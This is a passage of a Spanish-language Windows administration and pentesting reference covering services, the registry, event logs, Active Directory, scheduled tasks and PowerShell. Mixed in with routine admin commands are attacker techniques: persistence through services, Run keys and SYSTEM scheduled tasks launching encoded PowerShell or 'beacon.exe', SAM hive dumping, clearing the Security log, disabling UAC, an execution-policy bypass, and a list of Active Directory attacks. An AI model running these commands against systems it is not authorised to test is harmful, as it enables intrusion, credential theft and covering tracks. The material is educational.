net start "wuauserv" # iniciar
net stop "wuauserv" # detener
net pause "wuauserv" # pausar
net continue "wuauserv" # reanudar
```

#### 3.4.3 services.msc - GUI de servicios

Consola MMC. Accesible con Win+R -> services.msc.

Permite:
- Ver todos los servicios con estado, tipo de inicio, cuenta.
- Iniciar, detener, pausar, reanudar.
- Configurar tipo de inicio (Automatico, Automatico (Retrasado), Manual, Deshabilitado).
- Configurar cuenta de ejecucion (LocalSystem, LocalService, NetworkService, usuario especifico).
- Configurar opciones de recuperacion.
- Ver dependencias.

#### 3.4.4 Get-Service - PowerShell

```powershell
Get-Service # todos los servicios
Get-Service -Name wuauserv # servicio especifico
Get-Service | Where-Object {$_.Status -eq "Running"} # solo activos
Get-Service | Where-Object {$_.StartType -eq "Disabled"} # servicios deshabilitados

Start-Service -Name wuauserv
Stop-Service -Name wuauserv
Restart-Service -Name wuauserv
Set-Service -Name wuauserv -StartupType Automatic

New-Service -Name MiServicio -BinaryPathName "C:\tools\servicio.exe" -StartupType Automatic
```

#### 3.4.5 Tipos de inicio

| Tipo | Descripcion |
|------|-------------|
| Automatico | Arranca con el sistema |
| Automatico (Retrasado) | Arranca despues de otros servicios para acelerar el boot |
| Manual | Arranca bajo demanda |
| Deshabilitado | No arranca ni bajo demanda |

#### 3.4.6 Cuentas de servicio

- LocalSystem (NT AUTHORITY\SYSTEM): el mas privilegiado.
- LocalService (NT AUTHORITY\LOCAL SERVICE): menos privilegiado, red como anonymous.
- NetworkService (NT AUTHORITY\NETWORK SERVICE): red como la cuenta del equipo.
- Usuario especifico: credenciales de un usuario.

#### 3.4.7 Opciones de recuperacion

```cmd
sc failure wuauserv reset= 86400 actions= restart/5000/restart/10000/reboot/90000
```

- restart/5000: reiniciar el servicio despues de 5 segundos.
- restart/10000: reiniciar otra vez despues de 10 segundos.
- reboot/90000: reiniciar el sistema despues de 90 segundos.

#### 3.4.8 Persistencia con servicios

Para un atacante, los servicios son un excelente mecanismo de persistencia:

```cmd
sc create UpdateService binPath= "cmd /c powershell -enc <base64>" start= auto
sc failure UpdateService reset= 30 actions= restart/1000/restart/1000/reboot/60000
sc start UpdateService
```

En PowerShell:

```powershell
New-Service -Name "UpdateService" -BinaryPathName "C:\Windows\System32\cmd.exe /c C:\tools\beacon.exe" -StartupType Automatic
```

#### 3.4.9 Servicios interesantes para pentesting

| Servicio | Nombre | Notas |
|----------|--------|-------|
| Spooler | spoolsv.exe | Impresion. PrintNightmare, MS-PRN |
| LanmanServer | server | [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) - comparticion de archivos |
| LanmanWorkstation | workstation | Cliente SMB |
| Remote Registry | RemoteRegistry | Modificar registro remotamente |
| WinRM | winrm | Windows Remote Management |
| WMI | winmgmt | Windows Management Instrumentation |

---### 3.5 Registro de Windows

#### 3.5.1 Que es el registro?

El registro es una base de datos jerarquica que almacena configuraciones del sistema operativo, aplicaciones, hardware, preferencias de usuario, y mas.

Estructura: cinco hives (colmenas) principales, cada una montada desde un archivo en disco.

#### 3.5.2 Hives principales

| Hive | Archivo en disco | Contenido |
|------|------------------|-----------|
| HKLM\SAM | C:\Windows\System32\config\SAM | SAM (cuentas locales) |
| HKLM\SECURITY | C:\Windows\System32\config\SECURITY | Politicas de seguridad |
| HKLM\SOFTWARE | C:\Windows\System32\config\SOFTWARE | Config de software |
| HKLM\SYSTEM | C:\Windows\System32\config\SYSTEM | Config del sistema |
| HKCU | C:\Users\[Usuario]\NTUSER.DAT | Config del usuario actual |
| HKU | - | Contiene todos los usuarios cargados |
| HKCR | - | Asociaciones de archivos + [com](../raw/w1n-s9bsyst3ms.md#com) |
| HKCC | - | Perfil de hardware actual |

#### 3.5.3 Estructura del registro

```
HKLM \HARDWARE \SAM \SAM\Domains\Account\Users \000001F4 (Administrador) \SECURITY \SOFTWARE \Microsoft\Windows\CurrentVersion \Run <- persistencia \RunOnce <- persistencia \Uninstall <- lista de programas instalados \SYSTEM \CurrentControlSet\Services \.. <- servicios del sistema \Control\Session Manager\BootExecute
```

#### 3.5.4 Tipos de valores

| Tipo | Descripcion |
|------|-------------|
| REG_SZ | Cadena de texto simple |
| REG_EXPAND_SZ | Cadena con variables de entorno (%PATH%) |
| REG_BINARY | Datos binarios |
| REG_DWORD | Entero de 32 bits |
| REG_QWORD | Entero de 64 bits |
| REG_MULTI_SZ | Multiples cadenas separadas por null |

#### 3.5.5 reg.exe - Linea de comandos

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /s # recursivo

reg add HKLM\SOFTWARE\MiClave /v Nombre /t REG_SZ /d "Valor"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MiMalware" /t REG_SZ /d "C:\malware.exe"

reg delete HKLM\SOFTWARE\MiClave /v Nombre /f # borrar valor
reg delete HKLM\SOFTWARE\MiClave /f # borrar clave entera

reg export HKLM\SOFTWARE\MiClave backup.reg # exportar a archivo
reg import backup.reg # importar

reg save HKLM\SAM sam.hiv # guardar hive a archivo
reg restore HKLM\SAM sam.hiv # restaurar
```

#### 3.5.6 Claves de persistencia (para pentesting)

```cmd
# Run / RunOnce (usuario actual)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Run / RunOnce (todos los usuarios)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Active Setup
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components

# Startup folder
C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

# AppInit_DLLs
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

# Winlogon
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

# Boot Execute
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute

# Image Hijacking
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

#### 3.5.7 Claves de interes forense

```cmd
# Programas instalados
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall

# Dispositivos USB conectados
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR
HKLM\SYSTEM\CurrentControlSet\Enum\USB

# Redes WiFi conocidas
HKLM\SOFTWARE\Microsoft\WlanSvc\Interfaces

# Historial de ejecucion (MRU)
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

# UserAssist
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

# Typed URLs
HKCU\Software\Microsoft\Internet Explorer\TypedURLs

# Mounted devices
HKLM\SYSTEM\MountedDevices
```

#### 3.5.8 PowerShell y el registro

PowerShell trata el registro como un Psdrive:

```powershell
Set-Location HKLM:\Software\Microsoft\Windows\CurrentVersion
Get-ChildItem # listar subclaves
Get-ItemProperty . # valores de la clave

Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

New-Item -Path "HKCU:\Software\MiApp" -Force
New-ItemProperty -Path "HKCU:\Software\MiApp" -Name "Config" -Value "datos"

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware"
Remove-Item -Path "HKCU:\Software\MiApp" -Recurse
```

#### 3.5.9 ACLs en el registro

```powershell
Get-Acl -Path "HKLM:\SAM\SAM" | Format-List
```

Tecnicas de escalacion: si un usuario normal tiene permisos de escritura en claves que afectan servicios que corren como SYSTEM.

---### 3.6 Registro de Eventos

#### 3.6.1 Arquitectura de logs de Windows

Windows Event Log (WEL) es el sistema de logging. Los eventos se guardan en archivos .evtx en C:\Windows\System32\winevt\Logs\.

Categorias principales:
- **Application:** eventos de aplicaciones.
- **System:** eventos del sistema operativo.
- **Security:** eventos de seguridad (logins, uso de privilegios, etc.).
- **Setup:** eventos de instalacion.
- **Forwarded Events:** eventos reenviados desde otros sistemas.

#### 3.6.2 Event Viewer (eventvwr.msc)

La GUI clasica. Accesible con Win+R -> eventvwr.msc.

Permite:
- Navegar logs por categoria.
- Filtrar por nivel (Critical, Error, Warning, Information, Verbose).
- Filtrar por Event ID.
- Buscar texto.
- Crear vistas personalizadas.
- Adjuntar tareas a eventos.

#### 3.6.3 wevtutil - Utilidad de linea

```cmd
wevtutil el # enumerar logs disponibles
wevtutil gl Security # configuracion del log Security

wevtutil qe Security /c:10 # ultimos 10 eventos
wevtutil qe Security /f:text /q:"*[System[EventID=4624]]" # filtro por EventID

wevtutil epl Security export.evtx # exportar log a archivo
wevtutil cl Security # limpiar log (requiere admin)

wevtutil sl Security /ms:209715200 # tamano maximo (200MB)
wevtutil sl Security /rt:true # retencion (sobreescribir cuando lleno)
wevtutil sl Security /ab:true # auto-backup cuando lleno
```

#### 3.6.4 Get-WinEvent - PowerShell

```powershell
Get-WinEvent -LogName Security
Get-WinEvent -LogName Security -MaxEvents 10

# Filtrar por Event ID
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}

# Rango de tiempo
$start = (Get-Date).AddDays(-1)
Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$start}

# Exportar a CSV
Get-WinEvent -LogName Security -MaxEvents 1000 | Export-Csv -Path eventos.csv
```

#### 3.6.5 Event [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips) criticos para pentesting

| Event ID | Descripcion | Por que importa |
|----------|-------------|-----------------|
| 4624 | Inicio de sesion exitoso | Saber quien, cuando, desde donde |
| 4625 | Inicio de sesion fallido | [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) en curso |
| 4634 | Cierre de sesion | Timeline de actividad |
| 4648 | Inicio de sesion explicito (runas) | Ejecucion como otro usuario |
| 4672 | Privilegios especiales asignados | Cuenta con privilegios de admin |
| 4688 | Nuevo proceso creado | Ejecucion de procesos (comandos, malware) |
| 4698 | Tarea programada creada | Persistencia via schtasks |
| 4700 | Habilitacion de tarea programada | Activacion de persistencia |
| 4720 | Usuario creado | Nuevas cuentas en el sistema |
| 4732 | Miembro agregado a grupo | Escalacion de privilegios |
| 4740 | Cuenta bloqueada | Fuerza bruta que bloqueo cuentas |
| 4768 | TGT solicitado (Kerberos) | Autenticacion en dominio |
| 4776 | Validacion de credenciales | Logon fallido en dominio |
| 5140 | Acceso a recurso compartido | Acceso a archivos via SMB |
| 5156 | Conexion de red permitida | Conexiones salientes/entrantes |
| 7045 | Servicio instalado | Nuevo servicio (posible malware) |

#### 3.6.6 Logs forenses

Para un pentester:
- Buscar eventos 4624 (logins exitosos) fuera del horario laboral.
- Buscar eventos 4688 (procesos creados) con nombres sospechosos.
- Buscar eventos 7045 (servicios instalados) recientes.
- Correlacionar eventos 4625 + 4740 para detectar fuerza bruta.

```powershell
# Detectar fuerza bruta (muchos 4625 seguidos)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | Group-Object { $_.TimeCreated.ToString('yyyy-MM-dd HH:mm') } | Where-Object Count -gt 5
```

### 3.7 Red en Windows

#### 3.7.1 ipconfig

```cmd
ipconfig # configuracion basica de IP
ipconfig /all # toda la info (DNS, MAC, DHCP)
ipconfig /displaydns # cache DNS local
ipconfig /flushdns # limpiar cache DNS
ipconfig /release # liberar IP (DHCP)
ipconfig /renew # renovar IP (DHCP)
```

#### 3.7.2 netstat

```cmd
netstat -an # todas las conexiones y puertos
netstat -bno # conexiones con binario y PID
netstat -r # tabla de enrutamiento
netstat -s # estadisticas por protocolo
netstat -ano | findstr "LISTEN" # solo puertos escuchando
netstat -ano | findstr "ESTABLISHED"  # solo conexiones activas
```

#### 3.7.3 netsh

```cmd
netsh interface ip show config # configuracion de interfaces
netsh interface ip show addresses
netsh interface ip show dns

netsh advfirewall show allprofiles # estado del firewall
netsh advfirewall firewall show rule name=all # todas las reglas

netsh wlan show profiles # perfiles WiFi guardados
netsh wlan show profile nombre key=clear # contrasenia WiFi en texto claro
netsh wlan show interfaces # interfaces WiFi

netsh winsock reset # resetear winsock
netsh int ip reset # resetear IP stack
```

#### 3.7.4 route y [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp)

```cmd
route print # tabla de enrutamiento
route add 10.0.0.0 mask 255.0.0.0 192.168.1.1
route delete 10.0.0.0

arp -a # tabla ARP
arp -d # limpiar cache ARP
arp -s 192.168.1.5 00-11-22-33-44-55 # entrada estatica
```

#### 3.7.5 PowerShell networking

```powershell
Get-NetAdapter # adaptadores de red
Get-NetIPAddress # direcciones IP
Get-NetIPConfiguration # configuracion completa
Get-NetRoute # tabla de enrutamiento
Get-DnsClientCache # cache DNS

Test-NetConnection google.com # test de conectividad
Test-NetConnection google.com -Port 80  # test de puerto
Test-NetConnection -ComputerName server -TraceRoute  # traceroute

Get-NetFirewallProfile # perfiles de firewall
Get-NetFirewallRule | Where-Object Enabled -eq True  # reglas activas
New-NetFirewallRule -DisplayName "Bloquear" -Direction Inbound -Action Block -RemoteAddress 10.0.0.0/8
```

---### 3.8 Almacenamiento

#### 3.8.1 diskpart

DiskPart es la herramienta de particionado desde linea de comandos:

```cmd
diskpart # abre el shell interactivo
```

Dentro de diskpart:

```cmd
list disk # discos fisicos
select disk 0 # seleccionar disco
list partition # particiones del disco
select partition 1 # seleccionar particion
detail partition # detalles de la particion

create partition primary size=10000  # crear particion de 10GB
format fs=ntfs quick # formatear como NTFS
assign letter=E # asignar letra de unidad
active # marcar como activa

extend size=5000 # extender particion 5GB
shrink desired=2000 # reducir 2GB

clean # limpiar todo el disco
convert gpt # convertir a GPT
convert mbr # convertir a MBR
```

#### 3.8.2 diskmgmt.msc

Administrador de discos grafico. Accesible con Win+R -> diskmgmt.msc.

Permite:
- Ver discos, particiones y volumenes.
- Crear/eliminar/formatear particiones.
- Cambiar letras de unidad.
- Extender/reducir volumenes (NTFS).
- Inicializar discos (MBR/GPT).
- Crear volumenes simples, distribuidos, reflejados (RAID 1), etc.

#### 3.8.3 fsutil

Utilidad de sistema de archivos de bajo nivel:

```cmd
fsutil volume diskfree C: # espacio libre en C:
fsutil fsinfo drives # todas las unidades
fsutil fsinfo volumeinfo C: # informacion del volumen
fsutil fsinfo ntfsinfo C: # informacion NTFS

fsutil behavior query disablelastaccess  # ultimo acceso a archivos
fsutil behavior set disablelastaccess 1  # deshabilitar actualizacion de ultimo acceso

fsutil file queryfilenamebyid C: 0x0000000000000027  # nombre por ID de archivo
fsutil hardlink list archivo.txt # todos los hard links de un archivo
```

#### 3.8.4 VSS (Volume Shadow Copy)

Las copias de sombra permiten hacer snapshots de volumenes:

```cmd
vssadmin list shadows # listar copias de sombra existentes
vssadmin list writers # listar VSS writers (aplicaciones)
vssadmin create shadow /for=C: # crear shadow copy de C:
vssadmin delete shadows /for=C: /oldest  # borrar la mas vieja
```

Para un pentester, las shadow copies son interesantes porque pueden contener versiones anteriores de archivos, incluyendo SAM, SYSTEM y NTUSER.DAT:

```cmd
# Acceder a shadow copies
vssadmin list shadows
mklink /D C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

#### 3.8.5 PowerShell storage

```powershell
Get-Volume # todos los volumenes
Get-Disk # todos los discos fisicos
Get-Partition # todas las particiones

Get-PhysicalDisk # discos fisicos (incluye estado SMART)
Get-VirtualDisk # discos virtuales

Repair-Volume -DriveLetter C -Scan # escanear errores (chkdsk)
Repair-Volume -DriveLetter C -OfflineScanAndFix  # reparar
Optimize-Volume -DriveLetter C -Defrag  # desfragmentar (HDD)
Optimize-Volume -DriveLetter C -Retrim  # trim (SSD)
```

### 3.9 Gestion de Usuarios

#### 3.9.1 net user / net localgroup

Comandos clasicos de gestion de usuarios:

```cmd
net user # listar usuarios locales
net user pepe # informacion del usuario pepe
net user pepe Contrasenia123 /add # crear usuario con contrasenia
net user pepe /delete # borrar usuario
net user pepe /active:no # deshabilitar cuenta
net user pepe /active:yes # habilitar cuenta
net user pepe * # cambiar contrasenia (interactivo)
net user pepe /passwordchg:no # no puede cambiar contrasenia
net user pepe /expires:12/31/2025 # expiracion de cuenta

net localgroup # listar grupos locales
net localgroup Administradores # miembros del grupo
net localgroup Usuarios pepe /add # agregar usuario al grupo
net localgroup Usuarios pepe /delete  # remover usuario del grupo
net localgroup Administradores /add pepe  # dar admin
```

#### 3.9.2 lusrmgr.msc

Consola grafica de usuarios y grupos locales. Win+R -> lusrmgr.msc.

Permite crear, modificar, deshabilitar usuarios, administrar grupos, cambiar contrasenias.

#### 3.9.3 PowerShell - Get-LocalUser y Set-LocalUser

```powershell
Get-LocalUser # todos los usuarios locales
Get-LocalUser -Name pepe # usuario especifico
Get-LocalUser | Where-Object Enabled -eq $true  # solo habilitados

New-LocalUser -Name pepe -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)
New-LocalUser -Name pepe -NoPassword

Set-LocalUser -Name pepe -PasswordNeverExpires $true
Set-LocalUser -Name pepe -AccountExpires (Get-Date "12/31/2025")
Disable-LocalUser -Name pepe
Enable-LocalUser -Name pepe
Remove-LocalUser -Name pepe

Get-LocalGroup # grupos locales
Get-LocalGroupMember -Group Administradores
Add-LocalGroupMember -Group Administradores -Member pepe
Remove-LocalGroupMember -Group Administradores -Member pepe
```

#### 3.9.4 UAC (User Account Control)

UAC es el mecanismo de seguridad que pide confirmacion para acciones administrativas:

- Los procesos de administrador corren con dos tokens: uno filtrado (sin privilegios admin) y uno completo.
- Para usar el token completo, el usuario debe confirmar en el prompt de UAC (si esta en el escritorio) o proveer credenciales (si es usuario estandar).

```cmd
# Ejecutar como administrador desde CMD
runas /user:Administrador cmd
runas /user:DOMINIO\Administrador cmd
```

```powershell
# Ejecutar comando elevado
Start-Process cmd -Verb RunAs
```

UAC tiene diferentes niveles de notificacion:
- Siempre notificar (mas seguro).
- Notificar solo cuando las aplicaciones intentan cambios (por defecto).
- Notificar solo cuando las aplicaciones intentan cambios (sin atenuar escritorio).
- No notificar (deshabilitado - inseguro).

```cmd
# Modificar nivel de UAC (requiere admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f  # deshabilitar
```

Para un pentester, [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) es una tecnica comun en [escalada de privilegios](../raw/l1n9x-pr1v3sc.md).

---### 3.10 Dominios y active directory

#### 3.10.1 Que es [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md)?

Active Directory ([ad](../raw/w1nd0ws-d0m41n-4dm1n.md)) es el servicio de directorio de Microsoft para entornos empresariales. Almacena informacion sobre usuarios, computadoras, grupos, recursos y politicas en una red.

Componentes clave:
- **[domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller) (DC):** servidor que ejecuta AD DS y autentica a los usuarios.
- **Dominio:** unidad administrativa basica (ej: empresa.local).
- **Arbol:** conjunto de dominios con DNS contiguo.
- **Bosque (Forest):** conjunto de arboles que comparten esquema y catalogo global.
- **OU (Organizational Unit):** [contenedor](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) dentro del dominio para organizar objetos.
- **GC (Global Catalog):** indice de todos los objetos del bosque.

#### 3.10.2 Domain join

Un equipo se une al dominio para ser administrado centralmente:

```cmd
# Unir equipo al dominio
netdom join %COMPUTERNAME% /domain:empresa.local /UserD:Administrador /PasswordD:*

# Desde PowerShell
Add-Computer -DomainName empresa.local -Credential EMPRESA\Administrador -Restart
```

#### 3.10.3 gpupdate / gpresult

Herramientas para refrescar y ver [group policy](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy):

```cmd
gpupdate /force # forzar actualizacion de politicas
gpupdate /target:computer # solo politicas de equipo
gpupdate /target:user # solo politicas de usuario
gpupdate /sync # sincronizar (esperar a que termine)

gpresult /r # resumen de politicas aplicadas
gpresult /h gp.html # reporte HTML detallado
gpresult /z # super detallado
gpresult /scope user # solo politicas de usuario
gpresult /scope computer # solo politicas de equipo
```

#### 3.10.4 dsa.msc - Active Directory Users and Computers

Consola MMC para administrar AD. Win+R -> dsa.msc.

Permite:
- Crear, modificar, eliminar usuarios, grupos, computadoras, OUs.
- Restablecer contrasenias.
- Agregar usuarios a grupos.
- Delegar control administrativo.
- Ver propiedades de objetos (miembro de, pertenencias, etc.).

#### 3.10.5 Comandos utiles de AD

```cmd
# Buscar en AD desde linea
net user pepe /domain # informacion de usuario del dominio
net group "Domain Admins" /domain # miembros de un grupo global
net group "Domain Admins" pepe /add /domain  # agregar usuario a grupo

dsquery user -name pepe* # buscar usuarios por nombre
dsquery computer -name win* # buscar computadoras
dsquery group -name "Domain Admins"  # buscar grupos
dsget user CN=pepe,CN=Users,DC=empresa,DC=local -memberof  # grupos de un usuario

nltest /dsgetdc:empresa.local # encontrar Domain Controller
nltest /domain_trusts # confianzas entre dominios
```

#### 3.10.6 AD y pentesting

Para un pentester, Active Directory es uno de los objetivos mas jugosos:

- **[kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting):** pedir tickets TGS para servicios y crackearlos offline.
- **[as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting):** atacar usuarios sin pre-autenticacion Kerberos.
- **[pass-the-hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) ([pth](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash)):** autenticarse con el hash NTLM sin conocer la contrasenia.
- **[pass-the-ticket](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-ticket) ([ptt](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-ticket)):** usar tickets Kerberos robados.
- **[dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync):** replicar la base de datos de AD desde un DC (obtener todos los hashes).
- **[bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound):** mapear relaciones en AD para encontrar rutas de escalacion.
- **[golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket):** forjar un ticket TGT con el hash KRBTGT.
- **[silver ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#silver-ticket):** forjar un ticket TGS para un servicio especifico.

```cmd
# Enumeracion basica de AD
net user /domain # usuarios del dominio
net group "Domain Admins" /domain # admins del dominio
net localgroup Administradores # admins locales
```

### 3.11 Programador de Tareas

#### 3.11.1 schtasks

La herramienta de linea de comandos para tareas programadas:

```cmd
schtasks /query # listar todas las tareas
schtasks /query /fo LIST /v # formato detallado
schtasks /query /fo CSV # formato CSV

schtasks /create /tn "MiTarea" /tr "C:\script.ps1" /sc daily /st 09:00
schtasks /create /tn "Persistencia" /tr "cmd.exe /c calc.exe" /sc onlogon /ru SYSTEM

schtasks /run /tn "MiTarea" # ejecutar tarea inmediatamente
schtasks /end /tn "MiTarea" # detener tarea

schtasks /change /tn "MiTarea" /enable # habilitar
schtasks /change /tn "MiTarea" /disable  # deshabilitar
schtasks /change /tn "MiTarea" /ru SYSTEM  # cambiar usuario

schtasks /delete /tn "MiTarea" /f # borrar tarea

schtasks /create /tn "Recon" /tr "powershell -enc <base64>" /sc onstart /ru SYSTEM /rl HIGHEST
```

Disparadores comunes (/sc):
- ONLOGON: cuando el usuario inicia sesion.
- ONSTART: cuando arranca el sistema.
- DAILY: diario.
- WEEKLY: semanal.
- MINUTE: cada N minutos.
- ONIDLE: cuando el sistema esta inactivo.
- ONEVENT: cuando ocurre un evento especifico.

#### 3.11.2 taskschd.msc

Consola grafica del Programador de Tareas. Win+R -> taskschd.msc.

Permite navegar, crear, modificar, exportar/importar tareas, ver historial de ejecuciones.

#### 3.11.3 PowerShell - Scheduled Tasks

```powershell
Get-ScheduledTask # listar todas las tareas
Get-ScheduledTask -TaskName "MiTarea" # tarea especifica
Get-ScheduledTask | Where-Object State -eq Ready  # tareas listas

Get-ScheduledTaskInfo -TaskName "MiTarea"  # informacion de ultima ejecucion

Enable-ScheduledTask -TaskName "MiTarea"
Disable-ScheduledTask -TaskName "MiTarea"
Start-ScheduledTask -TaskName "MiTarea"
Stop-ScheduledTask -TaskName "MiTarea"
Unregister-ScheduledTask -TaskName "MiTarea" -Confirm:$false

# Crear tarea con disparador
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc <base64>"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "Persistencia" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "SYSTEM"
```

#### 3.11.4 Persistencia con tareas programadas

Para un atacante, las tareas programadas son un mecanismo de persistencia ideal:

```cmd
# Tarea que se ejecuta cada 5 minutos como SYSTEM
schtasks /create /tn "BrowserUpdate" /tr "C:\Windows\System32\cmd.exe /c C:\tools\beacon.exe" /sc minute /mo 5 /ru SYSTEM
```

Las tareas se guardan en C:\Windows\System32\Tasks\ como archivos XML.

---### 3.12 Directivas de Grupo (Group Policy)

#### 3.12.1 Que es Group Policy?

Group Policy es una infraestructura que permite a los administradores aplicar configuraciones centralizadas a usuarios y computadoras en un entorno de Active Directory.

Componentes:
- [gpo](../raw/w1nd0ws-d0m41n-4dm1n.md#group-policy) (Group Policy Object): objeto que contiene las politicas.
- GP template: archivos ADMX/ADML que definen las plantillas de politicas.
- Processing order: Local -> Site -> Domain -> OU (el ultimo en aplicar gana).

#### 3.12.2 gpmc.msc - Group Policy Management Console

Consola MMC para administrar GPOs. Win+R -> gpmc.msc.

Permite:
- Crear, editar, enlazar GPOs.
- Ver resultados de politicas.
- Modelar politicas.
- Delegar permisos sobre GPOs.

#### 3.12.3 gpresult /r

Ver que politicas se aplicaron:

`cmd
gpresult /r # resumen
gpresult /h reporte.html # reporte HTML
gpresult /z # detalle completo
gpresult /scope computer # solo equipo
gpresult /scope user # solo usuario
`

#### 3.12.4 GPO processing order

1. Local GP: C:\Windows\System32\GroupPolicy (el menos prioritario).
2. Site GPOs: enlazadas al sitio de AD.
3. Domain GPOs: enlazadas al dominio.
4. OU GPOs: enlazadas a la OU (las mas prioritarias).

#### 3.12.5 Computer vs User policies

- Computer Configuration: aplica a la computadora durante el arranque.
- User Configuration: aplica al usuario durante el login.

#### 3.12.6 GPOs interesantes para pentesting

- Startup/Shutdown scripts: ejecucion de scripts como SYSTEM.
- Logon/Logoff scripts: ejecucion al iniciar/cerrar sesion.
- Software Installation: instalacion forzada de software.
- Restricted Groups: membresia forzada de grupos.
- Registry: modificacion forzada del registro.

---
### 3.13 PowerShell a Fondo

#### 3.13.1 Introduccion

PowerShell es un shell de linea de comandos y lenguaje de [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) orientado a objetos construido sobre .NET. Es la herramienta mas poderosa para administracion de Windows y pentesting.

Caracteristicas clave:
- Cmdlets: comandos con nomenclatura Verbo-Sustantivo (Get-Process, Set-Service).
- [pipeline](../raw/c1cd-h4ck1ng.md#pipeline): pasa objetos entre cmdlets.
- Objetos: todo es un objeto .NET con propiedades y metodos.
- Remoting: ejecucion remota via WinRM.

#### 3.13.2 Cmdlets basicos

```powershell
Get-Command # todos los comandos disponibles
Get-Command -Noun Process
Get-Help Get-Process # ayuda de un cmdlet
Get-Help Get-Process -Examples # ejemplos
Get-Process # procesos
Get-Service # servicios
Get-ChildItem C:\Windows # listar archivos
Get-Content C:\file.txt # leer archivo
Set-Content C:\file.txt "texto" # escribir archivo
Copy-Item C:\a.txt C:\b.txt # copiar
Remove-Item C:\a.txt # borrar
New-Item -Path C:\Carpeta -ItemType Directory
```

#### 3.13.3 Pipeline y objetos

```powershell
Get-Process | Where-Object {$_.WorkingSet -gt 100MB} | Sort-Object WorkingSet -Descending | Select-Object -First 5

Get-Service | Where-Object {$_.Status -eq "Running"} | Format-Table Name, DisplayName, StartType
```

- Where-Object: filtrar objetos.
- Select-Object: seleccionar propiedades.
- Sort-Object: ordenar.
- ForEach-Object: procesar cada objeto.

#### 3.13.4 Modulos

```powershell
Get-Module -ListAvailable # modulos instalados
Import-Module ActiveDirectory # cargar modulo de AD
```

#### 3.13.5 Execution Policy

```powershell
Get-ExecutionPolicy # politica actual
Set-ExecutionPolicy RemoteSigned
Set-ExecutionPolicy Bypass
```

Bypass:
```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -enc <base64>
```

#### 3.13.6 PowerShell Remoting

```powershell
Enable-PSRemoting -Force # habilitar remoting
Enter-PSSession -ComputerName SERVIDOR
Invoke-Command -ComputerName SERVIDOR -ScriptBlock { Get-Process }

$session = New-PSSession -ComputerName SERVIDOR
Invoke-Command -Session $session -ScriptBlock { Get-Service }
Remove-PSSession $session
```

#### 3.13.7 Perfiles de PowerShell

```powershell
$PROFILE # ruta del perfil actual
Test-Path $PROFILE
New-Item -Path $PROFILE -ItemType File -Force
```

#### 3.13.8 PowerShell para pentesting

**Encoding (evasion):**
```powershell
$command = 'Get-Process'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
```

**Enumeracion:**
```powershell
$env:USERNAME
[Security.Principal.WindowsIdentity]::GetCurrent.Name

Get-WmiObject Win32_OperatingSystem | Select-Object Caption, OSArchitecture, Version
Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model, TotalPhysicalMemory
```

---
## 4. comparacion y Contraste

### 4.1 Linux vs Windows - Tabla comparativa

| Caracteristica | Linux | Windows |
|---------------|-------|---------|
